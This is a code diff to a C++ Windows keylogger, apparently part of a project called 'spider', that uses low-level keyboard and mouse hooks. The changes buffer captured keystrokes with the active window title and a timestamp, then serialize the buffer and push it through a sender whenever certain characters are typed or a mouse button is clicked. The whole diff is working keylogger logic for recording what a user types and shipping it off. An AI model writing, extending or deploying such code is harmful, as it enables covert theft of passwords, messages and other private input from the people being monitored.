@@ -25,6 +25,7 @@
 
 HHOOK hookKeyboard;
 HHOOK hookMouse;
+std::string	buff;
 
 LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
 {
@@ -106,8 +107,7 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       }
       else
 	str = tolower(str[0]);
-      infos.get()->data = str;
-      std::cout << str << std::endl;
+      buff += str;
     }
       /// actually the length of the str is superior at 1, it means that we have
       /// retrieved a vk code and that we should check either our correlingTable
@@ -117,8 +117,7 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       try
       {
 	str = spider::WindowsKeyLogger::keys.at(content->vkCode);
-	infos.get()->data = str;
-	std::cout << str << std::endl;
+	buff += str;
       }
       catch (std::out_of_range const &)
       {
@@ -126,8 +125,16 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       }
     }
   }
-  std::cout << "Going to push\n";
-  spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*infos)));
+  std::cout << static_cast<int>(str[0]) << std::endl;
+  if (str[0] == 83 || str[0] == 84 || str[0] == 69)
+  {
+    infos.get()->data = buff;
+    std::cout << buff << std::endl;
+    spider::BufferSender::BufferSenderInstance().push(
+      spider::Serializer::getSerializer().get_string_from_ptree(
+	spider::Serializer::getSerializer().serialize(*infos)));
+    buff.clear();
+  }
   return CallNextHookEx(hookKeyboard, code, wp, lp);
 }
 
@@ -140,7 +147,10 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
   std::stringstream		ss;
   std::string			timestamp;
   std::unique_ptr<t_mouse> 	infos(new t_mouse);
+  std::unique_ptr<t_message>	kb(new t_message);
+  bool				click;
 
+  click = false;
   /// initialisation and retrieve the timestamp for more accurate logs
   ts = std::time(nullptr);
   ss << ts;
@@ -154,6 +164,10 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
   infos.get()->timestamp = timestamp;
   infos.get()->type = "MOUSE";
 
+  kb.get()->process = windowTitle;
+  kb.get()->timestamp = timestamp;
+  kb.get()->type = "KEYSTROKE";
+
   mouseStruct = reinterpret_cast<MSLLHOOKSTRUCT *>(lp);
 
   infos.get()->keytype = 0;
@@ -166,16 +180,19 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
       infos.get()->keytype = 2;
       infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
       infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
+      click = true;
       break;
     case (WM_MBUTTONDOWN):
       infos.get()->keytype = 5;
       infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
       infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
+      click = true;
       break;
     case (WM_RBUTTONDOWN):
       infos.get()->keytype = 1;
       infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
       infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
+      click = true;
       break;
     case (WM_MOUSEWHEEL):
     {
@@ -200,6 +217,14 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
   }
   if (infos.get()->keytype != 0)
     spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*infos)));
+  if (click == true)
+  {
+    kb.get()->data = buff;
+    spider::BufferSender::BufferSenderInstance().push(
+      spider::Serializer::getSerializer().get_string_from_ptree(
+	spider::Serializer::getSerializer().serialize(*kb)));
+    buff.clear();
+  }
   return CallNextHookEx(hookMouse, code, wp, lp);
 }
 
